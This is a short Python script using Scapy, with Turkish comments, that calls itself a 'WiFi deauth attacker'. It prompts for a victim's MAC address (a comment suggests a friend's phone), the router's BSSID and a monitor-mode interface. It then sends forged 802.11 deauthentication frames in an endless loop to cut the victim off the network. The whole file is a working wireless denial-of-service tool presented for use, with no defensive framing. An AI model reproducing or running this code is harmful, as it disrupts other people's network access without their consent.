from scapy.all import *

print("--- WIFI DEAUTH ATTACKER ---")
# Hedefin MAC adresi (Arkadaşının telefonunun MAC adresi)
target_mac = input("Hedef MAC (örn: AA:BB:CC:11:22:33): ")
# Modemin MAC adresi
gateway_mac = input("Modem MAC (BSSID): ")
interface = input("Wifi Arayüzü (Monitör mod): ")

# Deauth Paketi Oluştur (Bağlantı Koparma)
# addr1: Hedef, addr2: Modem, addr3: Modem
pkt = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth()

print(f"🔥 SALDIRI BAŞLADI: {target_mac} internetten atılıyor...")
try:
    # Sonsuz döngüde paket yolla
    while True:
        sendp(pkt, iface=interface, count=100, inter=0.1, verbose=False)
        print(".", end="", flush=True)
except KeyboardInterrupt:
    print("\nSaldırı durduruldu.")